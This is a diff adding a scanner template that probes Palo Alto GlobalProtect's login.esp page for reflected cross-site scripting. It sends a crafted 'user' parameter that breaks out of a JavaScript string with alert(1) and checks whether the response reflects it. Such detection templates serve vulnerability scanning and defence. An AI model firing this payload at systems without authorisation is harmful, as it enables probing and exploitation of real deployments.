@@ -1,0 +1,18 @@
+id: globalprotect-xss
+info:
+  name: Global Protect XSS
+  risk: Medium
+
+params:
+  - root: "{{.BaseURL}}"
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/global-protect/login.esp?user=j%22;-alert(1)-%22x
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", 'var valueUser = "j";-alert(1)-"x";') && StringSearch("resHeaders", "text/html")
